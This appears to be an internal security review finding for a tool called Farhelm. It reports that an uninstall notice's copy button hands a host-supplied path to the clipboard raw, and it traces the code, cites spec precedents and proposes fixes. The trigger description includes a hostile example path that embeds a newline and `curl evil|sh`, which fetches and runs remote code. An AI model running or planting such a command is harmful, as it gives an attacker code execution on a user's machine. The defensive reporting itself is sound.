# The uninstall notice's copy button puts a host-reported path on the clipboard raw, with no hidden-characters warning

Reviewed commit: 08ab6e08f9ddd40b5494f2cbbeaaeb9d4e3332b7

## TLDR

After you uninstall Farhelm from a remote host, the hosts panel offers a "copy" button for the folder where that host's
data was kept. The panel shows the path with hidden characters made visible, but the button copies exactly what the
remote host reported, line breaks and hidden characters included, and says nothing about them. A hostile host could make
that "path" contain a line break followed by a command, which would run if you pasted it into a shell on your own
machine that does not guard pastes. The session header's copy buttons warn when a copied value contains hidden
characters; this one does not.

## Details

Found by the 2026-10-22 prioritized persistent review, group `161-ui-hosts-3of6` (finding f1, revision 2). Recording
first proposed dropping it; the independent reviewer disagreed, and this file records it with that reviewer's basis.

Mechanism:

- `crates/farhelm-ui/src/hosts.rs:2278-2288`: the uninstall notice's copy button calls
  `crate::session_view::copy_to_clipboard(&path)` with `notice.state_dir` unmodified and gives no hidden-characters
  feedback. The visible line, tooltip and accessible sentence show the same value escaped (`uninstall_notice_parts`,
  2763; `uninstall_notice_compact_parts`, 2777; `peer_parts_tooltip`, 2832), so the user sees an escaped path and gets
  the raw one.
- Where the value comes from: `plan.kept_state_dir` (`crates/farhelm-ui/src/provisioning.rs` around 1487 and 3600-3612)
  is the helm's uninstall plan `state_dir`. When the host has no stored state folder, the helm uses
  `inspection.default_state_dir` (`crates/farhelm-helm/src/provisioning/service.rs:1466-1469`), which
  `parse_uninstall_inspection` reads from the remote's NUL-separated output
  (`crates/farhelm-helm/src/provisioning/backend.rs:2763-2764`) through `bytes_path` (2843-2846), which accepts any
  bytes. The reviewer found no rejection of control characters or newlines on paths in
  `crates/farhelm-helm/src/provisioning` (the only `is_control` check is on a distro id, backend.rs around 3050). The
  path must also canonicalize on the host, which a hostile host can arrange by creating that directory (newlines are
  legal in Unix file names).
- Trigger: a compromised remote reports a default state folder such as `/home/u/.local/state/farhelm<LF>curl evil|sh`
  (through its own `HOME` or `XDG_STATE_HOME`, or by answering the inspection directly). The user uninstalls, clicks
  copy, and pastes into a local shell without bracketed paste (or into an `ssh other-host ...` command line).

Why this is not covered:

- SPEC.md:3238-3240 accepts a remote program writing the clipboard through OSC 52 ("an explicitly allowed, bounded
  effect across the remote-host boundary, including when a malicious program replaces the clipboard"). The independent
  reviewer judged that this does not cover an explicit copy button that hands over raw host-supplied text the GUI
  presented as a path: OSC 52 needs an attached terminal on that host, while here the user asked to copy what they were
  told is a path, so they have more reason to paste it into a shell.
- Ledger precedent: TRIAGE_OUTCOMES.md "session-header-raw-peer-text.md" (around 2287-2300) concerns the session
  header's copy buttons copying supervisor-supplied text raw. The user chose `fix code`: "keep copying the raw bytes;
  when a copied value contains characters `display_peer` escapes, the copy feedback says it contains hidden characters
  (shown as `<U+…>`) rather than refusing the copy". SPEC.md:1853 carries that over ("A hidden-characters copy warning
  opens upward from the bar and stays within the window").
- SPEC.md:3484-3487 trusts only the user's own configured host names, destinations and state folder in commands offered
  for copying, "never text a remote host supplies".
- SPEC.md "Local authority and trust between hosts", "Confirmed 2026-10-10" (around 3198-3202), escapes host-supplied
  text for display; it says nothing about copying.

How to verify: unit-test `parse_uninstall_inspection` with a default state field containing `\n` and follow it through
`plan_uninstall` to the UI plan's `state_dir.raw()`; then check that the notice's copy produces the raw value with no
warning. The reviewer did not check `layout.plan_uninstall` (called at service.rs around 1488) for a later rejection.

Fix shape: follow the session-header precedent and have the notice's copy feedback warn when the copied value contains
characters `display_peer` escapes. Alternatively refuse control characters in the planned state folder at the helm.

Suggested bucket: highest (security across the remote-host boundary). Triage may align the bucket with the
session-header precedent, which was decided as `fix code` without a recorded bucket in that entry's text.

Confidence: likely. Remaining unverified premise: that `layout.plan_uninstall` does not reject such a path.

Reviewer's proposed drop, not accepted by the independent check: the OSC 52 acceptance above, on the grounds that a
malicious remote can already put any text on the clipboard without a click.

Possible cover, for triage to judge: SPEC.md "Local authority and trust between hosts" (OSC 52 paragraph, around
3238-3243); TRIAGE_OUTCOMES.md "session-header-raw-peer-text.md" (precedent for the fix, not a cover).
